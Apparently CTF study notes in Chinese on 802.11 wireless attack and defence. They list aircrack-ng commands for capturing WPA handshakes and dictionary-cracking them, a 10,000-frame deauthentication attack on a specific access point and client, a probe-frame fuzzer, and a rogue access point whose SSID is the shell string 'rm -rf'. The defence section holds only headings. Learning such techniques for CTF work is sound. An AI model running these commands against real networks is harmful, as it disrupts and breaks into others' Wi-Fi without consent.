---
title: CTF | 无线网络-802.11攻与防
date: 2018-08-17 08:56:44
tags: 

---
<!-- more -->
### 常见的无线攻击威胁


#### fake ap攻击
#### ARP&Dns劫持
####  WIFI DOS 公攻击

#### 操作命令：

`iwconfig`   
`airm`   
`airodump-ng 名称`   
`airmon-ng start name`  
`airodump-ng --bssid xxx -c 信道 -w 保存文件 wlan0mon`   
`aircrack-ng 包 -w 字典 `  
`airodump-ng --bssid B4:0B:44:C2:D5:FF -c 11 -w xmantest wlan0mon`  
`--ivs` 只抓握手包

`airodump-ng wlan0mon`

切换信道：
`iwconfig wlan0mon channel 11`  
踢下线：
`aireplay-ng -0 10000 -a  B4:0B:44:C2:D5:FF -c C4:B3:01:C4:27:31 wlan0mon`
wlan.fc.type_subtype==12

### 无线攻防与进阶
- ProbeRequest Frame
  - ProbeRequest SSID 暴露位置信息&定位
- WPA-Radius 企业无线攻防
- 攻击802.11客户端
### 针对无线设备的漏洞挖掘
- 802.11 Fuzzing
- 
### 无线攻击的识别与防御

fuzz 要根据协议规范，不然协议不认，长度无所谓，但是帧类型的话要根据规范
要知道ap发给客户端还是客户端发给ap

wireshark 流量还原

#### wifuzz 小工具

`python wifuzz.py -s 尿尿 -i wlan0mon probe `
scapy  封装好协议 

`iwconfig wlan0mon channel 1`

`airbase-ng -e "rm -rf" -c 1 -v wlan0mon`


推荐博客：http://www.wiattack.net/index.php/archives/7/
